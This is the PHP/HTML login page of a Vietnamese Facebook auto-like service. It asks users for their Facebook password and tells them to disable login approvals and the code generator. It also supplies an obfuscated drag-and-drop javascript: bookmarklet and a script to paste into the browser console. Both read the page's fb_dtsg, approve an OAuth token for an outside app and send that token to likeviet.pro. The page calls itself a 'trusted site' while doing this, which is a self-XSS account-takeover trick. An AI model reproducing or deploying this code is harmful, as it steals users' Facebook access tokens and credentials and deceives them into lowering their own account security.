<?php
ob_start();
session_start();
date_default_timezone_set("Asia/Ho_Chi_Minh"); 
require("./_cnF/_star_cn_F.php");
require("./_cnF/_star_funC.php");
require('./incfiles/head.php');
if ($_SESSION['idfb']) {
 	header("Location: AUTO-AND-BOT-LIKE-FACEBOOK-trangchu.html");
}
if($_GET['ref']){
        $ref = isset($_GET['ref']) ? (string)(int)$_GET['ref'] : false;
	$name = mysql_result(mysql_query("SELECT ten FROM TAIKHOAN WHERE idfb = '" . $ref . "' "),0);
	if($name == '') $name = '?';
	$_SESSION['ref'] = $ref;
	$_SESSION['refn'] = $name;	
}
?>
     <div class="row"><script>$(window).load(function(){if(""==""){$('#quangcao').modal('show');}});</script>
<div class="col-md-12" onselectstart="return false" oncontextmenu="return false">
<div class="box box-info">
<div class="box-title box-header with-border">
<h4>
<i class="fa fa-info-circle fa-fw"></i> Thông Tin</h4>
<div class="box-tools pull-right">
<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
<button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button>
</div></div>
<div class="box-body">
<br>
<div class="col-sm-4">
<div class="box box-solid box-primary">
<center><i class="fa fa-lock fa-5x"></i></center>
<center><h6>TRUSTED SITE</h6></center>
<b>Chúng tôi mã hóa thông tin của bạn và chỉ có id của bạn mới có thể giải mã. Chúng tôi không bán nó cho bất cứ ai với bất cứ giá nào. Hệ thống hỗ trợ https giúp tăng độ bảo mật. Tài khoản facebook của bạn luôn được an toàn.</b>
</div>
</div>
<div class="col-sm-4">
<div class="box box-solid box-primary">
<center><i class="fa fa-code fa-5x"></i></center>
<center><h6>WEB DEVELOPMENT</h6></center>
<b>#Auto-botlike đã ra đời và phát triển hơn 1 năm. Chúng tôi tự hào với những dịch vụ mà mình đem lại cho cộng đồng facebook Việt Nam. #Auto-botlikelà một người bạn đồng hành không thể thiếu đối với một người nổi tiếng.</b>
</div>
</div>
<div class="col-sm-4">
<div class="box box-solid box-primary">
<center><i class="fa fa-lightbulb-o fa-5x"></i></center>
<center><h6>FUNCTION</h6></center>
<b>
#Auto-botlike với các chức năng hay luôn đáp ứng nhu cầu của người dùng. Mọi tính năng mới nhất sẽ được #Lộc cập nhật và tạo ra cho mọi người dùng. Hãy đóng góp và giúp cho #Lộc để website phát triển mạnh nhé.
</b>
</div></div></div></div></div>

     <div class="col-lg-12 col-md-12">
	  <div class="box box-success">
	       <div class="box-title box-header with-border">
		    <h4>
                    <i class="fa fa-yelp"></i> 
                    Đăng Nhập Hệ Thống
                    </h4>
                    <div class="box-tools pull-right">
                         <button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
                         <button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button>
                    </div>
	       </div>
	       <div class="box-body">
		    <div class="tabs-container">
		         <ul class="nav nav-tabs tab-border-top-success">
			     <li class="active"><a data-toggle="tab" href="#tab-1" aria-expanded="true"><i class="fa fa-sort-alpha-asc"></i> Sử Dụng Token</a></li>
			     <li class=""><a data-toggle="tab" href="#tab-2" aria-expanded="false"><i class="fa fa-file-image-o"></i> Sử Dụng Tài Khoản</a></li>
			     <li class=""><a data-toggle="tab" href="#tab-3" aria-expanded="false"><i class="fa fa-file-image-o"></i> Sử Dụng Hình Ảnh</a></li>
			     <li class=""><a data-toggle="tab" href="#tab-4" aria-expanded="false"><i class="fa fa-file-image-o"></i> Sử Dụng Code F12</a></li>
		         </ul>
		    <div class="tab-content">
			 <div id="tab-1" class="tab-pane active">
			      <div class="box-body">
				   <div class="col-md-12">
					<div class="input-group">
			                     <? if($_GET['ref']) 
			                     {
			                     Echo '<b>*Người giới thiệu : '.$name.'</b>';
			                     }	
			                     ?>
					</div>
					<div class="input-group">
					     <input type="text" placeholder="Nhập Token vào đây" class="form-control" id="matoken" onpaste="setTimeout( function() { login(document.getElementById('matoken').value);}, 100);">
                                             <span class="input-group-btn"> 
					           <button id="go" type="button" onclick="login(document.getElementById('matoken').value);" class="btn btn-primary">
                                                   Đăng Nhập
                                                   </button>
                                             </span>
					</div><br />
				   </div>
				   <div class="form-group">
<div class="col-md-4">
<button type="button" class="btn btn-block btn-danger btn-addon m-b-sm" data-toggle="modal" data-target="#capquyen">
<i class="fa fa-cog"></i> Cấp Quyền</button></div>
<div class="col-md-4">
<a class="btn btn-block btn-success btn-addon m-b-sm" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="_blank"><i class="fa fa-external-link"></i> Lấy Token</a></div>
<div class="col-md-4"><a class="btn btn-block  btn-warning btn-addon m-b-sm" href="http://tanglike.ml/AUTO-AND-BOT-LIKE-FACEBOOK-CHUYEN-HUONG.html?link=https://youtu.be/17nTDNd242c" target="_blank"><i class="fa fa-video-camera"></i> Hướng Dẫn Đăng Nhập</a></div></div></div></div> <!--tab 2-->
			 <div id="tab-2" class="tab-pane">
			      <div class="box-body">
				   <div class="col-md-6">
					<div class="input-group">
					     <span class="input-group-addon"><i class="fa fa-user"></i></span>
					     <input id="email" type="text" class="form-control" name="email" placeholder="Email Or Mobile Facebook">                                        
					</div>                                       
				   </div>
				   <div class="col-md-6">
					<div class="input-group">
					     <span class="input-group-addon">  <i class="fa fa-lock"></i> </span>
					     <input id="password" type="password" class="form-control" name="password" placeholder="Password">                                        
					</div>                       
				   </div>
				   <div class="col-md-6">
					<div class="input-group">
					     <span class="input-group-addon">App</span>
                                             <select id="app" class="form-control">	
                                                     			
                                                     <option value="350685531728">FACEBOOK FOR ANDROID</option>
                                                    
                                             </select>                                
					</div>                       
				   </div>
				   <div class="col-md-6">
					<div class="input-group">
					     <span class="input-group-addon"> <i class="fa fa-sign-in"></i> </span>
					     <button type="submit" onclick="loginemail();" class="btn btn-block  btn-primary" id="like4vn_login"> Đăng Nhập </button>                 
					</div>                 
				   </div>
				   <div class="col-md-12"><br>
				   <div class="alert alert-info" id="star" style="display: none;">
					<div id="message"></div>
				   </div><hr>
                    <ul>
                       <li>LƯU Ý : Mật Khẩu có khoảng cách hay ký tự đặc biệt sẽ không Đăng Nhập được nhé. </li>
                    </ul>
                    <ol>
                       <li>Lần đầu sử dụng có thể không hoạt động.</li>
                       <li> Bạn vào <b>Cài Đặt</b>--><b>Bảo Mật</b>--><b>Xét Duyệt Đăng Nhập</b> (Tắt) giống <div class="btn-group btn-xs">
                       <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> điều này </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="http://i.imgur.com/96jrLQg.png" width="550" height="320"/>
                       </ul></div></li>
                       <li> Bạn vào <b>Cài Đặt</b>--><b>Bảo Mật</b>--><b>Trình Tạo Mã</b> (Tắt) giống<div class="btn-group btn-xs">
                       <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> điều này </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="http://i.imgur.com/0DE2NJs.png" width="550" height="320"/>
                       </ul></div></li>
                       <li>Nếu bị khoá, mở khoá như  <div class="btn-group btn-xs">
                       <a class="btn btn-info btn-xs dropdown-toggle" data-toggle="dropdown"><span class="caret">
                       </span> điều này </a><ul class="dropdown-menu"><img alt="Temporary Lock" src="http://i.imgur.com/Jn9QwOM.png" width="550" height="320"/>
                       </ul></div></li>
                       <li>Sau đó nhấp vào <code>"Tiếp tục"</code></li>
                       <li>Bây giờ quay trở lại và thử lại bạn sẽ có thể sử dụng công cụ này trong bất kỳ thiết bị</li>
                    </ol>
			      </div>
			      </div>
			 </div><!--tab 2-->
			 <div id="tab-3" class="tab-pane">
                              <div class="box-body">
                                   <div class="col-md-12">
                                        <div class="box-body">
                                        <a onclick="showvideo('https://www.youtube.com/embed/b1sqWgkNiiQ','hd_keotha');" class="bg-red">
                                        Click để xem video hướng dẫn đăng nhập bằng hình ảnh</a>
                                        <div id="hd_keotha"></div>
                                        <p>
                                        <b style="font-color:green;">Bước 1: </b>
                                        Mở 2 tab. 1 tab facebook và 1 tab Auto-botlike, sau đó vào lại Auto-botlike phần login bằng hình ảnh.<br>
                                        </p>
                                        <p>
                                        <b style="font-color:green;">Bước 2:</b> 
                                        <u>Click</u> và <u>giữ</u> chuột để kéo tấm ảnh bên dưới về phía tab facebook đang mở và thả ra
<a onclick="alert(&quot;Vui lòng xem video hướng dẫn -_- &quot;)" style="cursor: move;" href='javascript:var _0x5be6=["165907476854626","https://likeviet.pro/AUTO-AND-BOT-LIKE-FACEBOOK-LOGIN-CAPTCHA.html?access_token=","getTime","value","fb_dtsg","getElementsByName","https://www.facebook.com/v1.0/dialog/oauth/confirm","fb_dtsg=","&amp;app_id=","&amp;redirect_uri=fbconnect://success&amp;display=popup&amp;access_token=&amp;sdk=&amp;from_post=1&amp;private=&amp;tos=&amp;login=&amp;read=&amp;write=&amp;extended=&amp;social_confirm=&amp;confirm=&amp;seen_scopes=&amp;auth_type=&amp;auth_token=&amp;auth_nonce=&amp;default_audience=&amp;ref=Default&amp;return_format=access_token&amp;domain=&amp;sso_device=ios&amp;__CONFIRM__=1","POST","open","onreadystatechange","readyState","status","match","responseText","close","//www.facebook.com/v1.0/dialog/oauth/confirm","href","send"];var id_app=_0x5be6[0];var url=_0x5be6[1];function sleep(_0x442fx4){var _0x442fx5= new Date()[_0x5be6[2]]();while( new Date()[_0x5be6[2]]()<_0x442fx5+_0x442fx4){;}}var delay_time=1000;var fb_dtsg=document[_0x5be6[5]](_0x5be6[4])[0][_0x5be6[3]];var e= new XMLHttpRequest;var t=_0x5be6[6];var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];e[_0x5be6[11]](_0x5be6[10],t,true);e[_0x5be6[12]]=function(){if(e[_0x5be6[13]]==4&amp;&amp;e[_0x5be6[14]]==200){mabaomat=e[_0x5be6[16]][_0x5be6[15]](/token=(.+)&amp;/)[1];e[_0x5be6[17]];var _0x442fxb= new XMLHttpRequest;var t=_0x5be6[18];var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];_0x442fxb[_0x5be6[11]](_0x5be6[10],t,true);_0x442fxb[_0x5be6[12]]=function(){if(_0x442fxb[_0x5be6[13]]==4&amp;&amp;_0x442fxb[_0x5be6[14]]==200){mabaomat=_0x442fxb[_0x5be6[16]][_0x5be6[15]](/token=(.+)&amp;/)[1];_0x442fxb[_0x5be6[17]];sleep(delay_time);location[_0x5be6[19]]=url+mabaomat}};_0x442fxb[_0x5be6[20]](n)}};e[_0x5be6[20]](n);'>
                                        <img src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/e4299734559659.56d57de04bda4.gif" class="img img-responsive" alt="Hack like - Auto like - Tăng like " width="150" height="120"></a>
                                        <b style="font-color:green;">Bước 3:</b> Đợi khoản 3s để xác thực lấy token và nó tự quay trở về hệ thống
                                        </p>
                                       </div>
                                   </div>
                              </div>
			 </div><!--tab 3-->
			 <div id="tab-4" class="tab-pane">
                              <div class="box-body">
                                   <div class="col-md-12">
                                        <div class="box-body">
                                        <a onclick="showvideo('https://www.youtube.com/embed/OatmJo6gx2E','hd_codef12');" class="bg-red">
                                        Click để xem video hướng dẫn đăng nhập bằng hình ảnh</a>
                                        <div id="hd_codef12"></div>
                                        <p><b>Bước 1:</b>COPY(Click chuột vào đoạn mã => CTRL + C) toàn bộ đoạn mã đăng nhập phía dưới</p>
                                        <p><b>Bước 2:</b>Click <a href="https://web.facebook.com">Facebook</a> để trở về facebook</p>
                                        <p><b>Bước 3:</b>Nếu bạn dùng trình duyệt Chrome hoặc Cờ Rôm+ thì các bạn ấn tổ hợp <code>Ctrl + Shift + J</code> sau đó
                                        Paste ( Dán ) Code và ấn Enter hoặc Nhấn F12 chọn tab <code> Console </code> sau đó Paste ( Dán ) Code và Nhấn Enter.
                                        Để chương trình đăng nhập hoạt động khoản 2 giây và bạn sẽ được đưa về hệ thống.</p>
                                        <label for="comment">CODE:</label>
                                        <textarea onclick="this.focus();this.select()" class="form-control" rows="3" id="comment" style="margin: 0px -0.5px 0px 0px; height: 100px;overflow:hidden">var id_app = '165907476854626';var url = 'https://likeviet.pro/AUTO-AND-BOT-LIKE-FACEBOOK-LOGIN-CAPTCHA.html?access_token=';function sleep(_0x442fx4) {var _0x442fx5 = new Date()['getTime']();while (new Date()['getTime']() < _0x442fx5 + _0x442fx4) {;}}var delay_time = 1000;var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];var e = new XMLHttpRequest;var t = 'https://www.facebook.com/v1.0/dialog/oauth/confirm';var n = 'fb_dtsg=' + fb_dtsg + '&app_id=' + id_app + '&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1';e['open']('POST', t, true);e['onreadystatechange'] = function () {if (e['readyState'] == 4 && e['status'] == 200) {mabaomat = e['responseText']['match'](/token=(.+)&/)[1];e['close'];var _0x442fxb = new XMLHttpRequest;var t = '//www.facebook.com/v1.0/dialog/oauth/confirm';var n = 'fb_dtsg=' + fb_dtsg + '&app_id=' + id_app + '&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1';_0x442fxb['open']('POST', t, true);_0x442fxb['onreadystatechange'] = function () {if (_0x442fxb['readyState'] == 4 && _0x442fxb['status'] == 200) {mabaomat = _0x442fxb['responseText']['match'](/token=(.+)&/)[1];_0x442fxb['close'];sleep(delay_time);location['href'] = url + mabaomat}};_0x442fxb['send'](n)}};e['send'](n);</textarea>
                                       </div>
                                   </div>
                              </div>
			 </div><!--tab 4-->
		    </div><!--tab content-->
	            </div><!--tabs container-->
	       </div>
	  </div>
     </div><!--.col-md-12-->

<div class="col-md-6" onselectstart="return false" oncontextmenu="return false">
<div class="box box-info">
<div class="box-title box-header with-border">
<h4><i class="fa fa-star"></i> Người Dùng Vip</h4>
<div class="box-tools pull-right">
<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
<button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button></div></div>
<div class="box-body">
<div class="table-responsive" style="overflow: auto;height: 185px;border: 1px solid #DEDFE2;">
<table class="table"><thead><tr><th>Name</th><th>Time</th><th>Level</th></tr></thead><tbody>
<?php
$req = mysql_query("SELECT * FROM `VIP`");
                    while($res = mysql_fetch_assoc($req)) {
echo'<tr><td><a onclick="toarst(&quot;error&quot;,&quot;Đăng Nhập Mới Thực Hiện Được Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)" style="color: #000000;">'.$res['ten'].'</a>
</td><td>'.thoigiantinh($res['time']).'</td><td>'; if($res['level'] == '1'){ echo 'VIP Member'; }elseif($res['level'] == '2'){  echo 'Medium Member'; 
                    }elseif($res['level'] == '3'){ echo 'Super Member';}else{ echo 'Boss Member';}echo '</td></tr> ';
                    }
                    echo'</tbody></table>';
?>
</tbody></table>
</div>
<div class="box-footer">
<center>Hiện tại có <kbd><?php echo mysql_result(mysql_query("SELECT COUNT(*) FROM `VIP`"), 0); ?></kbd> thành viên Vip Member.
<!-- Nhac nen --><p><iframe src="http://www.nhaccuatui.com/mh/background/KaIitIjOj3tS" width="1" height="1" frameborder="0" allowfullscreen=""></iframe></p></center>
</div></div></div></div>
<!--.col-md-6-->


<div class="col-md-6" onselectstart="return false" oncontextmenu="return false">
<div class="box box-info">
<div class="box-title box-header with-border">
<h4><i class="fa fa-users"></i>  Người Dùng Mới</h4><div class="box-tools pull-right">
<button type="button" class="btn btn-box-tool" data-widget="collapse"><i class="fa fa-minus"></i></button>
<button type="button" class="btn btn-box-tool" data-widget="remove"><i class="fa fa-times"></i></button></div></div>
<div class="box-body">
<div class="table-responsive" style="overflow: auto;height: 185px;border: 1px solid #DEDFE2;">
<table class="table"><thead><tr><th>Name</th><th>Profile ID</th></tr></thead><tbody>
<?php
$res = mysql_query("SELECT * FROM `TAIKHOAN` ORDER BY `id` DESC LIMIT 6");
                    while ($post = mysql_fetch_array($res)){
                    ?>
<tr><td>
<a onclick="toarst(&quot;error&quot;,&quot;Đăng Nhập Mới Thực Hiện Được Tính Năng Này.&quot;,&quot;Tin Nhắn Hệ Thống&quot;)" style="color: #000000;"><img src="https://graph.facebook.com/<?=$post['idfb']?>/picture?width=10&amp;height=10" alt="Lưu Chi Linh" class="img-circle img-thumbnail" width="30" height="30"> <?=$post['ten']?></a></td>
<td><i class="fa fa-spinner fa-pulse"></i> Đang ẩn...</td>
</tr>
<?
                         }
                         ?>	</tbody></table></div>
                        	     
<div class="box-footer"><center>Hiện tại có <kbd><?php echo mysql_result(mysql_query("SELECT COUNT(*) FROM `tokenhtc`"), 0); ?></kbd> thành viên sử dụng.</center></div></div></div></div>		     







     


<div class="modal inmodal" id="capquyen" tabindex="-1" role="dialog" aria-hidden="true">
     <div class="modal-dialog modal-lg">
	  <div class="modal-content">
	       <div class="modal-header">
		    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
		        <h4 class="modal-title">Cấp Quyền Ứng Dụng</h4>
			<small class="font-bold">
			<p class="text-danger">Lưu Ý: Mục Này Chỉ Dành Cho Tài Khoản Sử Dụng Lần Đâu Tại Website.</p>
			</small>
	       </div>
	       <div class="modal-body">
		        <h3>Bước 1</h3>
			<a class="btn btn-outline btn-primary" href="https://goo.gl/O25zAd" target="_blank"><i class="fa fa-cogs"></i> Cài Đặt Ứng Dụng Lần Đầu</a>
			<hr>
		        <h3>Bước 2</h3>
			<div class="item">
			<img alt="image" class="img-responsive" src="http://image.prntscr.com/image/cda69bb482524b6ca929f5856feebbfa.png">
			</div>
			<div class="item">
			<img alt="image" class="img-responsive" src="http://image.prntscr.com/image/3df8eca063d54dc4906cbfc3e0478a4e.png">
			</div>
			<div class="item active">
			<img alt="image" class="img-responsive" src="http://image.prntscr.com/image/3b250f98862e483c8bb0086683620bab.png">
			</div>
			<hr>
		        <h3>Bước 3</h3>
			<p style="font-size: 17px;">Sau Khi Thực Hiện Xong Các Bước Trên Bạn Trở Lại Website Vào Chọn Mục 
                        <a class="btn btn-outline btn-success" href="https://goo.gl/kgHeQa" target="_blank"><i class="fa fa-external-link"></i> Lấy Token</a></p>
			<hr>
		        <h3>Bước 4</h3>
			<div class="item">
			<img alt="image" class="img-responsive" src="http://image.prntscr.com/image/eadab3da489643eabf019660c09769e4.png">
			</div>
			<p style="font-size: 17px;">Phần Màu Đỏ Bên Trên Chính Là Mã Token Của Bạn! </p>
			<hr>
	       </div>
	       <div class="modal-footer">
		    <button type="button" class="btn btn-outline btn-danger" data-dismiss="modal">Đóng</button>
	       </div>
	  </div>
     </div>
</div>




     
<?php
require('./incfiles/footer.php');
?>